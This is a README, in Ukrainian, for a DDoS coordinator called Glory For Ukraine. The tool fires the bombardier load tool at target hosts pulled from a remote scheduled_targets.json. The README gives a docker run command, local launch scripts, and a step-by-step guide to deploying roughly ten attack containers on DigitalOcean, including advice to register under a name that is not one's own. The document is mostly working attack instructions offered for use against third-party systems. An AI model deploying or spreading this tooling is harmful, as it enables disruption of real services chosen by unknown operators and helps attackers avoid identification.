# Glory For Ukraine

DDOS координатор, використовуючий bombardier на один з хостів указаний в scheduled_targets.json, скачаний з https://gloryforukraine.pages.dev/scheduled_targets.json

## Як використати

Запуск через докер: `docker run --env SCHEDULED_TARGETS_URL=https://gloryforukraine.pages.dev/scheduled_targets.json PARALLEL_FACTOR=5 --rm -it archdev/gloryforukraine`

Запуск через білд: 
- install NodeJS 16+
- git clone
- cd gloryforukraine
- npm i
- `./scripts/launch.sh` or `.\scripts\launch.bat`

# Як засетапи Gloryforukraine на Digigal Ocean App Platform

1. Зареєструйте аккаунт на Digital Ocean:
    [Посилання за рефералом](https://m.do.co/c/aa9c8e1fc61f) - дає $100 на рахунок
    По особистим данним - будь яке ім'я (можна не своє) АЛЕ: робочий імейл до якого у вас є доступ - він потрібен щоб залогінитись по лінку який прийде вам на імейл (2FA)
    Також вам потрібна робоча банківська карта (укр карти Моно на Привата раніше працювали, віртуальні карти теж UK банків теж працюють)
    (Гроші НЕ БУДУТЬ зніматись відразу, лише через місяц)
2. Створіть новий апчик в Create > Apps
3. Виберіть Docker Hub
4. в Image введіть: `archdev/gloryforukraine`, tag - залишіть пустим (`latest`) 
5. ОБОВ'ЯЗКОВО: Type > **Worker** (по замовчуванню там Web Service) 
6. Виберіть Регіон - можна Європу або Азію - будь який
7. Finalise and Launch - виберіть аккаунт Pro - і в Containers: Pro - штук 10 має вистачити